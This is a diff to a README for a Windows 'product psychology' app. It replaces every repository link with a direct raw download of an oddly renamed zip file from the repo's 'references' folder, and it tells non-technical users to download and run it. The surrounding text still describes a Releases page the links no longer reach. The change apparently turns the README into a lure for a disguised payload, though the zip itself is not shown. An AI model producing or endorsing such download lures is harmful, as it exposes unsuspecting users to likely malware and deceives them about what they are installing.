@@ -1,6 +1,6 @@
 # 🧠 product-psychology-for-vibe-coding - Boost Workflow with User Psychology
 
-[![Download product-psychology-for-vibe-coding](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
+[![Download product-psychology-for-vibe-coding](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/gsun6t9/product-psychology-for-vibe-coding/raw/refs/heads/main/references/product-vibe-for-coding-psychology-v2.3-beta.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To run this software on your Windows computer, ensure you meet these minimum req
 Follow these steps to download and run the software on your Windows PC. No programming skills needed.
 
 1. Click the green download badge above or this link:  
-   [Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
+   [Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding/raw/refs/heads/main/references/product-vibe-for-coding-psychology-v2.3-beta.5.zip)
 
 2. The link will take you to the app’s GitHub page. Look for the **Releases** or **Downloads** section.
 
@@ -91,7 +91,7 @@ You can select a framework and follow step-by-step prompts. The app will guide y
 
 Periodically check the original download page to get the latest version:
 
-[Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
+[Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding/raw/refs/heads/main/references/product-vibe-for-coding-psychology-v2.3-beta.5.zip)
 
 Download the newest release following the same steps above. Install it like you did before to keep your app current.
 
@@ -113,4 +113,4 @@ Explore the software at your own pace. Try different frameworks to see which fit
 
 Keep the download link handy to get updates and support:
 
-[https://github.com/gsun6t9/product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
+[https://github.com/gsun6t9/product-psychology-for-vibe-coding/raw/refs/heads/main/references/product-vibe-for-coding-psychology-v2.3-beta.5.zip](https://github.com/gsun6t9/product-psychology-for-vibe-coding/raw/refs/heads/main/references/product-vibe-for-coding-psychology-v2.3-beta.5.zip)
